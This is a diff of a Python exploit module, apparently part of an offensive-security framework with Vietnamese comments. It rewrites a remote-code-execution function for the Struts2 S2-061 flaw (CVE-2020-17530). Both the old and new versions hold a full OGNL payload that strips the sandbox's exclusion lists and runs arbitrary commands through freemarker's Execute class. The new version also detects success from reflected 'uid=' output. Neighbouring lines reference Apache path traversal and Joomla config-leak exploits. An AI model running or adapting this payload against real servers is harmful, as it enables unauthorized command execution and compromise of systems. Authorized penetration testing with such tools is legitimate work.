@@ -86,39 +86,33 @@ def apache_path_traversal_rce(base_url: str, command: str = "id", *, double: boo
 
 
 def struts2_ognl_rce(base_url: str, command: str = "id") -> PrimitiveResult:
-    """CVE-2020-17530 Struts2 S2-061 — forced double-OGNL eval. POST `/` form `name=<OGNL>&age=1`,
-    dùng freemarker Execute. Bọc `/bin/sh -c` để chèn nonce. Oracle: nonce + `uid=`."""
+    """CVE-2020-17530 Struts2 S2-061 — forced double-OGNL eval. POST `/index.action` field `id=<OGNL>`.
+    freemarker `Execute.exec` chạy command qua `Runtime.exec` (KHÔNG shell → không chèn được nonce
+    kiểu `sh -c`); output tự phản chiếu vào response (double eval). Oracle: `uid=` reflected — tất
+    định (payload gửi đi KHÔNG chứa `uid=`)."""
     name = "struts2_ognl_rce"
     host, port, tls = _split(base_url)
-    n = _nonce()
-    shell_cmd = f"echo {n}; {command}"
-    inner = "','".join(["/bin/sh", "-c", shell_cmd])
-    # OGNL variant CÓ ghi response writer → output phản chiếu vào body (oracle nonce dùng được;
-    # payload gốc pocsuite là blind, không in output).
-    ognl = ("%{('Powered_by').(#UnicodeSec=#application['org.apache.tomcat.InstanceManager'])."
-            "(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap'))."
-            "(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue))."
-            "(#context=#potats0.get('context')).(#potats0.setBean(#context))."
-            "(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet'))."
-            "(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet))."
-            "(#potats0.put('excludedPackageNames',#emptySet))."
-            "(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute'))."
-            "(#cmd={'" + inner + "'}).(#res=#exec.exec(#cmd))."
-            "(#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'))."
-            "(#resp.setContentType('text/plain')).(#resp.getWriter().println(#res))."
-            "(#resp.getWriter().flush()).(#resp.getWriter().close())}")
-    data = f"name={quote(ognl)}&age=1"
+    cmd = command.replace("'", "").replace("\\", "")     # tránh vỡ OGNL literal
+    ognl = ("%{(#im=#application['org.apache.tomcat.InstanceManager'])."
+            "(#stack=#attr['com.opensymphony.xwork2.util.ValueStack.ValueStack'])."
+            "(#bean=#im.newInstance('org.apache.commons.collections.BeanMap'))."
+            "(#bean.setBean(#stack)).(#context=#bean.get('context')).(#bean.setBean(#context))."
+            "(#macc=#bean.get('memberAccess')).(#bean.setBean(#macc))."
+            "(#es=#im.newInstance('java.util.HashSet'))."
+            "(#bean.put('excludedClasses',#es)).(#bean.put('excludedPackageNames',#es))."
+            "(#al=#im.newInstance('java.util.ArrayList')).(#al.add('" + cmd + "'))."
+            "(#ex=#im.newInstance('freemarker.template.utility.Execute')).(#ex.exec(#al))}")
+    body = "id=" + quote(ognl, safe="")
     hdr = {"Content-Type": "application/x-www-form-urlencoded"}
     try:
-        st, resp = _raw_http(host, port, "POST", "/", headers=hdr, body=data, tls=tls)
+        st, resp = _raw_http(host, port, "POST", "/index.action", headers=hdr, body=body, tls=tls)
     except Exception as exc:
         return PrimitiveResult("inconclusive", "none", f"request lỗi: {exc}", primitive=name)
-    if n in resp:
-        out = resp.split(n, 1)[-1].strip()[:600]
-        uid = bool(_UID_RE.search(resp))
+    m = re.search(r"uid=\d+\([^\n<]{0,120}", resp)       # payload không chứa 'uid=' → match = RCE thật
+    if m:
         return PrimitiveResult("exploit_success", "strong",
-                               f"nonce {n} reflected → OGNL RCE (uid_indicator={uid})", output=out, primitive=name)
-    return PrimitiveResult("exploit_failed", "none", f"no nonce echo (status {st})", primitive=name)
+                               f"Execute.exec RCE (S2-061): {m.group(0)}", output=m.group(0), primitive=name)
+    return PrimitiveResult("exploit_failed", "none", f"no uid indicator (status {st})", primitive=name)
 
 
 def joomla_config_leak(base_url: str, command: str | None = None) -> PrimitiveResult:
